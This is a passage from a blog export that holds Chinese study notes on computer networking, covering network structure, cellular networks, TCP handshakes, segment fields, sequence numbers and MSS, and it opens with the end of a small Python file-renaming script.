flag == <span class="number">1</span>:</span><br><span class="line">        new_name = <span class="string">&#x27;Python-&#x27;</span> + name</span><br><span class="line">    <span class="comment"># 删除指定字符</span></span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="number">2</span>:</span><br><span class="line">        num = <span class="built_in">len</span>(<span class="string">&#x27;Python-&#x27;</span>)</span><br><span class="line">        new_name = name[num:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印新⽂件名，测试程序正确性</span></span><br><span class="line"><span class="built_in">print</span>(new_name)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 重命名</span></span><br><span class="line">os.rename(dir_name+name, dir_name+new_name)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程语言</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络_拉勾教育</title>
    <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<p>内容主要来自于拉勾教育《计算机网络通关29讲》</p>
<span id="more"></span>

<h1 id="01-漫游互联网：什么是蜂窝移动网络"><a href="#01-漫游互联网：什么是蜂窝移动网络" class="headerlink" title="01 | 漫游互联网：什么是蜂窝移动网络"></a>01 | 漫游互联网：什么是蜂窝移动网络</h1><h2 id="1-1-网络的组成"><a href="#1-1-网络的组成" class="headerlink" title="1.1 网络的组成"></a>1.1 网络的组成</h2><p>由无数个节点构成一个个小型网络，再再由小型网络组成重型网络，再组成大型网络，最后组成完整的网络世界。</p>
<h3 id="1-1-1-公司内网"><a href="#1-1-1-公司内网" class="headerlink" title="1.1.1 公司内网"></a>1.1.1 公司内网</h3><p><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/%E5%85%AC%E5%8F%B8%E5%86%85%E7%BD%91%E7%BB%93%E6%9E%84%E7%A4%BA%E4%BE%8B.png" alt="公司内网结构示例"></p>
<p>公司网络从<strong>本地网络服务提供商（Internet Service Provider, ISP）</strong>接入，然后内部再分成一个个子网。</p>
<p>网络中的线路也被称作<strong>通信链路（Communication Link）</strong>，用于传输网络信号。有的网络节点会同时接入多条链路，数据传输到这些节点时需要选择方向，因此这些节点需要进行<strong>交换（Switch）</strong></p>
<p>数据发生交换时，会从一条链路进入交换设备，然后缓存下来，再转发到另一条链路，如下图所示：<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/%E5%B0%81%E5%8C%85%E4%BA%A4%E6%8D%A2.png" alt="封包交换"></p>
<p>网络中数据是以分组或者包（Packet）的形式传输，因此这种数据切换链路技术也称为<strong>封包交换技术（Packet Switch）</strong></p>
<p>网络中常见的具有交换能力的设备是<strong>路由器（Router）</strong>和**链路层交换机(Link-Layer Switch)**。</p>
<p>局域网络之间，可以通过路由器、交换机进行连接，从而构成一个更大的局域网。</p>
<h3 id="1-1-2-移动网络"><a href="#1-1-2-移动网络" class="headerlink" title="1.1.2 移动网络"></a>1.1.2 移动网络</h3><p>前面提到的网络传输中需要的通信链路是一个抽象概念。无线信号的发送接收器可以构成通信链路，蓝牙信道也可以构成通信链路。</p>
<p>移动网络中，无线信号构成通信链路。通信的核心被称作蜂窝塔（Cellular Tower），也称作基站（BaseStation）。每个蜂窝塔只覆盖一个六边形的范围，这种六边形的结构可以让信号无死角覆盖。如果是圆，圆与圆之间会有间隙。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/%E8%9C%82%E5%B7%A2%E7%BD%91%E7%BB%9C%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="蜂巢网络示意图"></p>
<p>一个蜂窝网络构造大体如下图:<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/%E8%9C%82%E7%AA%9D%E7%A7%BB%E5%8A%A8%E7%BD%91%E7%BB%9C%E6%9E%84%E6%88%90.png" alt="蜂窝移动网络构成"><br>网络提供商将网络供给处于蜂窝网络边缘的路由器，路由器连接蜂窝塔，再通过蜂窝塔（基站）提供给处于六边形地区中的设备。</p>
<p>将网络提供给一个子网的行为，称为网络提供（Network Provider）<br>对一个子网连接提供商的网络，称为网络接入（Network Access）</p>
<p>实际上随着蜂窝网格中设备越来越多，基站覆盖的网络常常是重叠的。这样设计的好处是，当一个基站过载、出现故障、不稳定时，可以切换到另一个基站的网络。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/%E5%9F%BA%E7%AB%99%E9%87%8D%E5%8F%A0%E7%9A%84%E7%BD%91%E6%A0%BC%E5%92%8C%E8%BE%B9%E7%BC%98%E8%AE%A1%E7%AE%97%E8%8A%82%E7%82%B9.png" alt="基站重叠的网格和边缘计算节点"></p>
<p>另一方面，在一定范围内的区域，离用户较近的地方还可以部署服务器，帮助用户完成计算。这相当于计算资源的下沉，称为<strong>边缘计算</strong>。相比中心化的计算，边缘计算延迟低、链路短，能够将更好的体验带给距离边缘计算集群最近的节点。从而让用户享受到更优质、延迟更低、算力更强的服务。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/%E8%BE%B9%E7%BC%98%E8%AE%A1%E7%AE%97.png" alt="边缘计算"></p>
<h3 id="1-1-3-家庭网络"><a href="#1-1-3-家庭网络" class="headerlink" title="1.1.3 家庭网络"></a>1.1.3 家庭网络</h3><p><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/%E5%AE%B6%E7%94%A8%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84.png" alt="家用网络结构"><br>家用网络现在已经发展成一种网格状的连接。一方面家用网络会通过路由器接入本地 ISP 提供的网络服务。另一方面，一些设备，比如电脑、笔记本、手机、冰箱等都可以直接和路由器连接。<strong>路由器也承担了链路层网关的作用</strong>，作为家用电器之间信息的交换设备。</p>
<p>一些家用电器承担了蓝牙设备的控制器，如智能音箱。上图的智能音箱把家用网络带向了一个网格状，有的设备会同时连接路由器（WI-FI）和智能音箱，这样手机和音箱都可以直接控制这些设备。</p>
<h3 id="1-1-4-整体关系"><a href="#1-1-4-整体关系" class="headerlink" title="1.1.4 整体关系"></a>1.1.4 整体关系</h3><p><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/%E4%BA%92%E8%81%94%E7%BD%91%E6%95%B4%E4%BD%93%E7%BB%93%E6%9E%84.png" alt="互联网整体结构"><br>最顶部的全球或国家大型的 ISP 之间联网，构成了网络的主干。然后区域性的 ISP 承接主干网络，在这个基础之上再向家庭和公司提供接入服务。移动蜂窝网络因为部署复杂，往往也是由大型 ISP 直接提供。</p>
<h2 id="1-2-数据的传输"><a href="#1-2-数据的传输" class="headerlink" title="1.2 数据的传输"></a>1.2 数据的传输</h2><p>为了传递数据，在网络中有几个特别重要的抽象。最终提供服务或者享受服务的设备，称为<strong>终端（Terminal）</strong>，或者<strong>端系统（End System）</strong>，有时候简单称为<strong>主机（Host）</strong>。比如说：电脑、手机、冰箱、汽车等，我们都可以看作是一个主机（Host）。</p>
<p>网络传输分成两类，一类是端到端（Host-to-Host）的能力，由 TCP/IP 协议群提供。还有一类是广播的能力，是一对多、多对多的能力，可以看作是端到端（Host-to-Host）能力的延伸。</p>
<p>网络基础设施往往不能一次性传输太大的数据量，因此通常会将数据分片传输。比如传输一个 MP3，我们会将 MP3 内容切分成很多个组，每个组也称作一个封包，英文都是 Packet。这样，如果一个封包损坏，只需要重发损坏的封包，而不需要重发所有数据。</p>
<p>另一方面，网络中两点间的路径非常多，如果一条路径阻塞了，部分封包可以考虑走其他路径。发送端将数据拆分成封包（Packet），封包在网络中遇到岔路，由交换器和路由器节点决定走向，接收端再组包。下图对封包交换技术的一个演示。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/封包交换技术.gif" alt="封包交换技术"/></p>
<h2 id="1-3-总结"><a href="#1-3-总结" class="headerlink" title="1.3 总结"></a>1.3 总结</h2><p>互联网是一个非常庞大的结构，从整体来看，互联网是一个立体的、庞大的网状结构。但是如果将它放大、再放大，将镜头拉近，在微观层面，我们会看到一个个网络、一台台设备，还会看到大量的封包在交换、有设备在不断地改变封包的走向、损坏的封包被重发、一个个光电信号被转化和传输。</p>
<h1 id="02-传输层协议-TCP：TCP-为什么握手是-3-次、挥手是-4-次？"><a href="#02-传输层协议-TCP：TCP-为什么握手是-3-次、挥手是-4-次？" class="headerlink" title="02 | 传输层协议 TCP：TCP 为什么握手是 3 次、挥手是 4 次？"></a>02 | 传输层协议 TCP：TCP 为什么握手是 3 次、挥手是 4 次？</h1><p>TCP 和 UDP 是今天应用最广泛的传输层协议，拥有最核心的垄断地位。今天互联网的整个传输层，几乎都是基于这两个协议打造的。无论是应用开发、框架设计选型、做底层和优化，还是定位线上问题，只要碰到网络，就逃不开 TCP 协议相关的知识。</p>
<p>TCP（Transport Control Protocol）是一个传输层协议，提供 Host-To-Host 数据的可靠传输，支持全双工，是一个连接导向的协议。</p>
<h3 id="2-1-主机到主机（Host-To-Host）如何通信？"><a href="#2-1-主机到主机（Host-To-Host）如何通信？" class="headerlink" title="2.1 主机到主机（Host-To-Host）如何通信？"></a>2.1 主机到主机（Host-To-Host）如何通信？</h3><p>TCP 提供的是 Host-To-Host 传输，一台主机通过 TCP 发送数据给另一台主机。这里的主机（Host）是一个抽象的概念，可以是手机、平板、手表等。收发数据的设备都是主机，所以双方是平等的。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/TCP-IP%E4%BA%94%E5%B1%82%E6%A8%A1%E5%9E%8B.png" alt="TCP/IP 5层模型"></p>
<p><strong>TCP 协议往上是应用到应用（Application-To-Application）的协议。</strong>什么是应用到应用的协议呢？比如用微信发信息给张三，微信客户端、微信聊天服务都是应用。微信有自己的聊天协议，微信的聊天协议是应用到应用的协议；如果微信的聊天协议想要工作，就需要一个主机到主机的协议帮助它实现通信。</p>
<p>TCP 上层的应用层协议要使用 TCP 能力的时候，需要告知 TCP 是哪个应用——这就是端口号。端口号用于区分应用。</p>
<p>TCP 要实现主机到主机通信，就需要知道主机的网络地址（IP 地址），但是 TCP 不负责实际地址到地址（Address-To-Address）的传输，因此 TCP 协议把 IP 地址给底层的网络层处理。</p>
<p><strong>网络层（Netowrk Layer）</strong>，提供地址到地址的通信，IP 协议就在这一层工作。网络层解决地址到地址的通信，但是不负责信号在具体两个设备间传递。因此，网络层会调用下方的<strong>链路层</strong>在两个相邻设备间传递信息。当信号在两个设备间传递的时候，<strong>物理层</strong>封装最底层的物理设备、传输介质等，由最下方的物理层提供最底层的传输能力。</p>
<h3 id="2-2-什么是连接和会话？"><a href="#2-2-什么是连接和会话？" class="headerlink" title="2.2 什么是连接和会话？"></a>2.2 什么是连接和会话？</h3><p>连接是通信双方的一个约定，目标是让两个在通信的程序之间产生一个默契，保证两个程序都在线，而且尽快地响应对方的请求，这就是连接（Connection）。</p>
<p>设计上，连接是一种传输数据的行为。传输之前，建立一个连接。具体来说，数据收发双方的内存中都建立一个用于维护数据传输状态的对象，比如双方 IP 和端口是多少？现在发送了多少数据了？状态健康吗？传输速度如何？等。所以，<strong>连接是网络行为状态的记录。</strong></p>
<p>和连接关联的还有一个名词，叫作<strong>会话（Session），会话是应用的行为</strong>。比如微信里你要和张三聊天，你们创建一个聊天窗口，这个就是会话。你开始传输数据，你和微信服务器间建立一个连接。如果你们聊一段时间，各自休息了，约定先不要关微信，1 个小时后再回来。那么连接会断开，因为聊天窗口没关，所以会话还在。</p>
<p>有些系统设计中，会话会自动重连（也就是重新创建连接），或者帮助创建连接。 此外，会话也负责在多次连接中保存状态，比如 HTTP Session 在多次 HTTP 请求（连接）间保持状态（如用户信息）。</p>
<p><strong>会话是应用层的概念，连接是传输层的概念。</strong></p>
<h3 id="2-3-单工-双工问题"><a href="#2-3-单工-双工问题" class="headerlink" title="2.3 单工/双工问题"></a>2.3 单工/双工问题</h3><p>在任何一个时刻，如果数据只能单向发送，就是<strong>单工</strong>，所以单工需要至少一条线路。如果在某个时刻数据可以向一个方向传输，也可以向另一个方向反方向传输，而且交替进行，叫作<strong>半双工</strong>；半双工需要至少 1 条线路。最后，如果任何时刻数据都可以双向收发，这就是<strong>全双工</strong>，全双工需要大于 1 条线路。当然这里的线路，是一个抽象概念，你可以并发地处理信号，达到模拟双工的目的。</p>
<p><strong>TCP 是一个双工协议，数据任何时候都可以双向传输</strong>。这就意味着客户端和服务端可以平等地发送、接收信息。正因为如此，客户端和服务端在 TCP 协议中有一个平等的名词——<strong>Host（主机）</strong>。</p>
<h3 id="2-4-什么是可靠性？"><a href="#2-4-什么是可靠性？" class="headerlink" title="2.4 什么是可靠性？"></a>2.4 什么是可靠性？</h3><p><strong>可靠性指数据保证无损传输</strong>。如果发送方按照顺序发送，然后数据无序地在网络间传递，就必须有一种算法在接收方将数据恢复原有的顺序。另外，如果发送方同时要把消息发送给多个接收方，这种情况叫作多播，可靠性要求每个接收方都无损收到相同的副本。多播情况还有强可靠性，就是如果有一个消息到达任何一个接收者，那么所有接受者都必须收到这个消息。</p>
<h3 id="2-5-TCP的握手和挥手"><a href="#2-5-TCP的握手和挥手" class="headerlink" title="2.5 TCP的握手和挥手"></a>2.5 TCP的握手和挥手</h3><p>TCP 是一个连接导向的协议，设计有建立连接（握手）和断开连接（挥手）的过程。TCP 没有设计会话（Session），因为会话通常是一个应用的行为。</p>
<p>TCP 协议有这样几个基本操作：</p>
<ul>
<li>如果一个 Host 主动向另一个 Host 发起连接，称为 SYN（Synchronization），请求同步；</li>
<li>如果一个 Host 主动断开请求，称为 FIN（Finish），请求完成；</li>
<li>如果一个 Host 给另一个 Host 发送数据，称为 PSH（Push），数据推送。</li>
</ul>
<p>以上 3 种情况，接收方收到数据后，都需要给发送方一个 ACK（Acknowledgement）响应。请求/响应的模型是可靠性的要求，如果一个请求没有响应，发送方可能会认为需要重发这个请求。</p>
<h3 id="2-6-建立连接的过程（三次握手）"><a href="#2-6-建立连接的过程（三次握手）" class="headerlink" title="2.6 建立连接的过程（三次握手）"></a>2.6 建立连接的过程（三次握手）</h3><p>因为要保持连接和可靠性约束，TCP 协议要保证每一条发出的数据必须给返回，返回数据叫作 ACK（也就是响应）。</p>
<p>按照这个思路，建立连接需要 3 次握手：<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/TCP3%E6%AC%A1%E6%8F%A1%E6%89%8B.png" alt="TCP3次握手"></p>
<ol>
<li>客户端发消息给服务端（SYN）</li>
<li>服务端准备好进行连接</li>
<li>服务端针对客户端的 SYN 给一个 ACK<br>服务端还没有确定客户端是否准备好了,所以还要继续确认。比如步骤 3 之后，服务端马上给客户端发送数据，这个时候客户端可能还没有准备好接收数据。因此还需要增加一个过程。</li>
<li>服务端发送一个 SYN 给客户端</li>
<li>客户端准备就绪</li>
<li>客户端给服务端发送一个 ACK<blockquote>
<p>步骤1、3、4、6 是传输数据，算是握手，3、4合并成 SYN-ACK 响应。</p>
</blockquote>
</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B.png" alt="3次握手"></p>
<p>从上面的例子中，可以进一步思考 SYN、ACK、PSH 这些常见的标识位（Flag）在传输中如何表示。</p>
<p>一种思路是为 TCP 协议增加协议头。在协议头中取多个位（bit），其中 SYN、ACK、PSH 都占有 1 个位。比如 SYN 位，1 表示 SYN 开启，0 表示关闭。因此，SYN-ACK 就是 SYN 位和 ACK 位都置 1。这种设计，我们也称为标识（Flag）。标识位是放在 TCP 头部的。</p>
<h3 id="2-7-断开连接的过程-4次挥手"><a href="#2-7-断开连接的过程-4次挥手" class="headerlink" title="2.7 断开连接的过程(4次挥手)"></a>2.7 断开连接的过程(4次挥手)</h3><ol>
<li>客户端要求断开连接，发送一个断开的请求，这个叫作（FIN）。</li>
<li>服务端收到请求，然后给客户端一个 ACK，作为 FIN 的响应。  </li>
<li>这里需要思考一个问题，可不可以像握手那样马上传 FIN 回去？<br>这个时候服务端不能马上传 FIN，因为断开连接要处理的问题比较多，比如说服务端可能还有发送出去的消息没有得到 ACK；也有可能服务端自己有资源要释放。因此断开连接不能像握手那样操作——将两条消息合并。所以，服务端经过一个等待，确定可以关闭连接了，再发一条 FIN 给客户端。</li>
<li>客户端收到服务端的 FIN，同时客户端也可能有自己的事情需要处理完，比如客户端有发送给服务端没有收到 ACK 的请求，客户端自己处理完成后，再给服务端发送一个 ACK。</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/4%E6%AC%A1%E6%8C%A5%E6%89%8B.png" alt="4次挥手.png"></p>
<h3 id="2-8-总结"><a href="#2-8-总结" class="headerlink" title="2.8 总结"></a>2.8 总结</h3><p>在学习 3 次握手、4 次挥手时，一定要理解为什么这么设计，而不是死记硬背。</p>
<ol>
<li>TCP 提供连接（Connection），让双方的传输更加稳定、安全。</li>
<li>TCP 没有直接提供会话，因为应用对会话的需求多种多样，比如聊天程序会话在保持双方的聊天记录，电商程序会话在保持购物车、订单一致，所以会话通常在 TCP 连接上进一步封装，在应用层提供。</li>
<li>TCP 是一个面向连接的协议（Connection -oriented Protocol），说的就是 TCP 协议参与的双方（Host）在收发数据之前会先建立连接。后面我们还会学习 UDP 协议，UDP 是一个面向报文（Datagram-oriented）的协议——协议双方不需要建立连接，直接传送报文（数据）。</li>
<li>连接需要消耗更多的资源。比如说，在传输数据前，必须先协商建立连接。因此，不是每种场景都应该用连接导向的协议。像视频播放的场景，如果使用连接导向的协议，服务端每向客户端推送一帧视频，客户端都要给服务端一次响应，这是不合理的。</li>
</ol>
<p><strong>TCP 为什么是 3 次握手，4 次挥手？</strong><br>TCP 是一个双工协议，为了让双方都保证，建立连接的时候，连接双方都需要向对方发送 SYC（同步请求）和 ACK（响应）。</p>
<p>握手阶段双方都没有烦琐的工作，因此一方向另一方发起同步（SYN）之后，另一方可以将自己的 ACK 和 SYN 打包作为一条消息回复，因此是 3 次握手——需要 3 次数据传输。</p>
<p>到了挥手阶段，双方都可能有未完成的工作。收到挥手请求的一方，必须马上响应（ACK），表示接收到了挥手请求。最后等所有工作结束，再发送请求中断连接（FIN），因此是 4 次挥手。</p>
<p><strong>一台内存在 8G 左右的服务器，可以同时维护多少个连接？</strong></p>
<ul>
<li>tcp连接数上限其实受限于机器的内存，以8G内存为例，假设一个tcp连接需要占用的最小内存是8k（发送接收缓存各4k，当然还要考虑socket描述符），那么最大连接数为：8<em>1024</em>1024/8=1048576个，即约100万个tcp长连接。不过这只是理论数值，并未考虑实际业务。</li>
</ul>
<h1 id="03-TCP-的封包格式：TCP-为什么要粘包和拆包？"><a href="#03-TCP-的封包格式：TCP-为什么要粘包和拆包？" class="headerlink" title="03 | TCP 的封包格式：TCP 为什么要粘包和拆包？"></a>03 | TCP 的封包格式：TCP 为什么要粘包和拆包？</h1><h3 id="3-1-TCP的拆包和粘包"><a href="#3-1-TCP的拆包和粘包" class="headerlink" title="3.1 TCP的拆包和粘包"></a>3.1 TCP的拆包和粘包</h3><p>TCP 是一个传输层协议。TCP 发送数据的时候，往往不会将数据一次性发送，像下图这样：<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/TCP%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE1.png" alt="TCP发送数据1"><br>而是将数据拆分成很多个部分，然后再逐个发送。像下图这样：<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/TCP%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE2.png" alt="TCP发送数据2"></p>
<p><strong>TCP 为什么不一次发送完所有的数据？</strong><br>这里有很多原因，比如为了<strong>稳定性</strong>，一次发送的数据越多，出错的概率越大。再比如说为了<strong>效率</strong>，网络中有时候存在着并行的路径，拆分数据包就能更好地利用这些并行的路径。再有，比如发送和接收数据的时候，都存在着缓冲区。如下图所示：<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/%E5%8F%91%E9%80%81%E6%8E%A5%E6%94%B6%E7%BC%93%E5%AD%98.png" alt="发送接收缓存"></p>
<p>缓冲区是在内存中开辟的一块区域，目的是缓冲。因为大量的应用频繁地通过网卡收发数据，这个时候，网卡只能一个一个处理应用的请求。当网卡忙不过来的时候，数据就需要排队，也就是将数据放入缓冲区。如果每个应用都随意发送很大的数据，可能导致其他应用实时性遭到破坏。</p>
<p>还有一些原因，比如内存的最小分配单位是页表，如果数据的大小超过一个页表，可能会存在页面置换问题，造成性能的损失。</p>
<p>总之，方方面面的原因：在传输层封包不能太大。这种限制，往往是以缓冲区大小为单位的。也就是 TCP 协议，会将数据拆分成不超过缓冲区大小的一个个部分。每个部分有一个独特的名词，叫作 <strong>TCP 段（TCP Segment）</strong>。在接收数据时，一个个 TCP 段又被重组成原来的数据。</p>
<p>像这样，数据经过拆分，然后传输，然后在目的地重组，俗称<strong>拆包</strong>。所以拆包是将数据拆分成多个 TCP 段传输。那么粘包是什么呢？有时候，如果发往一个目的地的多个数据太小了，为了防止多次发送占用资源，TCP 协议有可能将它们合并成一个 TCP 段发送，在目的地再还原成多个数据，这个过程俗称<strong>粘包</strong>。所以粘包是将多个数据合并成一个 TCP 段发送。</p>
<h3 id="3-2-TCP-Segment"><a href="#3-2-TCP-Segment" class="headerlink" title="3.2 TCP Segment"></a>3.2 TCP Segment</h3><p>下图是一个 TCP 段的格式：<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/TCP%20%E6%AE%B5.png" alt="TCP 段"></p>
<p>TCP 协议就是依靠每一个 TCP 段工作的，所以每认识一个 TCP 的能力，几乎都会找到在 TCP Segment 中与之对应的字段。</p>
<ul>
<li>Source Port/Destination Port 描述的是发送端口号和目标端口号，代表发送数据的应用程序和接收数据的应用程序。比如 80 代表 HTTP 服务，22 是 SSH 服务</li>
<li>Sequence Number 和 Achnowledgment Number 是保证可靠性的两个关键。</li>
<li>Data Offset 是一个偏移量。这个量存在的原因是 TCP Header 部分的长度是可变的，因此需要一个数值来描述数据从哪个字节开始。</li>
<li>Reserved 是很多协议设计会保留的一个区域，用于日后扩展能力。</li>
<li>URG/ACK/PSH/RST/SYN/FIN 是几个标志位，用于描述 TCP 段的行为。也就是一个 TCP 封包到底是做什么用的。（标志位可以混合使用）<ul>
<li>URG 代表这是一个紧急数据，比如远程操作的时候，用户按下了 Ctrl+C，要求终止程序，这种请求需要紧急处理。</li>
<li>ACK 代表响应，我们在“02 | 传输层协议 TCP：TCP 为什么握手是 3 次、挥手是 4 次？”讲到过，所有的消息都必须有 ACK，这是 TCP 协议确保稳定性的一环。</li>
<li>PSH 代表数据推送，也就是在传输数据的意思。</li>
<li>SYN 同步请求，也就是申请握手。</li>
<li>FIN 终止请求，也就是挥手。</li>
</ul>
</li>
<li>Window 是 TCP 保证稳定性并进行流量控制的工具</li>
<li>Checksum 是校验和，用于校验 TCP 段有没有损坏。</li>
<li>Urgent Pointer 指向最后一个紧急数据的序号（Sequence Number）。它存在的原因是：有时候紧急数据是连续的很多个段，所以需要提前告诉接收方进行准备。</li>
<li>Options 中存储了一些可选字段，比如 MSS（Maxiumun Segment Size）。</li>
<li>Padding 存在的意义是因为 Options 的长度不固定，需要 Pading 进行对齐。</li>
</ul>
<h4 id="3-2-1-Sequence-Number-和-Acknowledgement-Number"><a href="#3-2-1-Sequence-Number-和-Acknowledgement-Number" class="headerlink" title="3.2.1 Sequence Number 和 Acknowledgement Number"></a>3.2.1 Sequence Number 和 Acknowledgement Number</h4><p>在 TCP 协议的设计当中，数据被拆分成很多个部分，部分增加了协议头。合并成为一个 TCP 段，进行传输。这个过程，我们俗称拆包。这些 TCP 段经过复杂的网络结构，由底层的 IP 协议，负责传输到目的地，然后再进行重组。</p>
<p>稳定性要求数据无损地传输，也就是说拆包获得数据，又需要恢复到原来的样子。而在复杂的网络环境当中，即便所有的段是顺序发出的，也不能保证它们顺序到达，因此，发出的每一个 TCP 段都需要有序号。这个序号，就是 Sequence Number（Seq）。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/Sequence%20Number.png" alt="Sequence Number"></p>
<p>发送数据的时候，为每一个 TCP 段分配一个自增的 Sequence Number。接收数据的时候，虽然得到的是乱序的 TCP 段，但是可以通过 Seq 获得完整的顺序。</p>
<p>接收方如果要回复发送方，也需要这个 Seq。而网络的两个终端，去同步一个自增的序号是非常困难的。因为任何两个网络主体间，时间都不能做到完全同步，又没有公共的存储空间，无法共享数据，更别说实现一个分布式的自增序号了。此时需要用到发送的字节数和接收的字节数。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/Sequence%20bytes.png" alt="Sequence bytes"></p>
<p>重新定义一下 Seq（如上图所示），对于任何一个接收方，如果知道了发送者发送某个 TCP 段时，已经发送了多少字节的数据，那么就可以确定发送者发送数据的顺序。</p>
<p>但是这里有一个问题。如果接收方也向发送者发送了数据请求（或者说双方在对话），接收方就不知道发送者发送的数据到底对应哪一条自己发送的数据了。</p>
<p>因此我们还需要另一个数据，就是每个 TCP 段发送时，发送方已经接收了多少数据。用 Acknowledgement Number 表示，下面简写为 ACK。</p>
<p>下图中，终端发送了三条数据，并且接收到四条数据，通过观察，根据接收到的数据中的 Seq 和 ACK，将发送和接收的数据进行排序。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/Sequence%20Number2.png" alt="Sequence Number2"><br>上图中，发送方发送了 100 字节的数据，而接收到的（Seq = 0 和 Seq =100）的两个封包，都是针对发送方（Seq = 0）这个封包的。发送 100 个字节，所以接收到的 ACK 刚好是 100。说明（Seq= 0 和 Seq= 100）这两个封包是针对接收到第 100 个字节数据后，发送回来的。这样就确定了整体的顺序。(感觉这段有问题)</p>
<p>注意，无论 Seq 还是 ACK，都是针对“对方”而言的。是对方发送的数据和对方接收到的数据。</p>
<h4 id="3-2-2-MSS（Maxiumun-Segment-Size）"><a href="#3-2-2-MSS（Maxiumun-Segment-Size）" class="headerlink" title="3.2.2 MSS（Maxiumun Segment Size）"></a>3.2.2 MSS（Maxiumun Segment Size）</h4><p>这个可选项控制了 TCP 段的大小，它是一个协商字段（Negotiate）。协议是双方都要遵循的标准，因此配置往往不能由单方决定，需要双方协商。</p>
<p>TCP 段的大小（MSS）涉及发送、接收缓冲区的大小设置，双方实际发送接收封包的大小，对拆包和粘包的过程有指导作用，因此需要双方去协商。</p>
<p>如果这个字段设置得非常大，就会带来一些影响。</p>
<p>首先对方可能会拒绝，作为服务的提供方，可能不会愿意接收太大的 TCP 段。因为大的 TCP 段，会降低性能，比如内存使用的性能。</p>
<p>其次，支持 TCP 协议工作的 IP 协议，工作效率会下降。TCP 协议不肯拆包，IP 协议就需要拆出大量的包。那么 IP 协议为什么需要拆包呢？这是因为在网络中，每次能够传输的数据不可能太大，这受限于具体的网络传输设备，也就是物理特性。但是 IP 协议，拆分太多的封包并没有意义。因为可能会导致属于同个 TCP 段的封包被不同的网络路线传输，这会加大延迟。同时，拆包，还需要消耗硬件和计算资源。</p>
<p>那是不是 MSS 越小越好呢？MSS 太小的情况下，会浪费传输资源（降低吞吐量）。因为数据被拆分之后，每一份数据都要增加一个头部。如果 MSS 太小，那头部的数据占比会上升，这让吞吐量成为一个灾难。所以在使用的过程当中，MSS 的配置，往往都是一个折中的方案。而根据 Unix 的哲学，不要去猜想什么样的方案是最合理的，而是要尝试去用实验证明它，一切都要用实验依据说话。</p>
<h3 id="3-3-总结"><a href="#3-3-总结" class="headerlink" title="3.3 总结"></a>3.3 总结</h3><p>TCP 协议是如何恢复数据的顺序的，TCP 拆包和粘包的作用是什么？</p>
<p>TCP 拆包的作用是将任务拆分处理，降低整体任务出错的概率，以及减小底层网络处理的压力。拆包过程需要保证数据经过网络的传输，又能恢复到原始的顺序。这中间，需要数学提供保证顺序的理论依据。TCP 利用（发送字节数、接收字节数）的唯一性来确定封包之间的顺序关系。</p>
<p>粘包是为了防止数据量过小，导致大量的传输，而将多个 TCP 段合并成一个发送。</p>
<h1 id="04-TCP-的稳定性：滑动窗口和流速控制"><a href="#04-TCP-的稳定性：滑动窗口和流速控制" class="headerlink" title="04 | TCP 的稳定性：滑动窗口和流速控制"></a>04 | TCP 的稳定性：滑动窗口和流速控制</h1><p>TCP 利用发送字节数和接收字节数，这个二元组的唯一性保证顺序。</p>
<p><strong>TCP 作为一个传输层协议，最核心的能力是传输。传输需要保证可靠性，还需要控制流速，这两个核心能力均由滑动窗口提供。</strong>而滑动窗口中解决的问题，是今后的工作中可以长期使用的，比如设计一个分布式的 RPC 框架、实现一个消息队列或者分布式的文件系统等。</p>
<h3 id="1-请求-响应模型"><a href="#1-请求-响应模型" class="headerlink" title="1. 请求/响应模型"></a>1. 请求/响应模型</h3><p>TCP 中每个发送的请求都需要响应。如果一个请求没有收到响应，发送方就会认为这次发送出现了故障，会触发重发。</p>
<p>大体的模型，和下图很像。但是如果完全和下图一样，每一个请求收到响应之后，再发送下一个请求，吞吐量会很低，浪费带宽。带宽没有用满，意味着可以同时发送更多的请求，接收更多的响应。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/TCP%20%E8%AF%B7%E6%B1%82-%E5%93%8D%E5%BA%94%E6%A8%A1%E5%9E%8B%EF%BC%88%E5%90%9E%E5%90%90%E9%87%8F%E4%BD%8E%EF%BC%89.png" alt="TCP 请求-响应模型（吞吐量低）"></p>
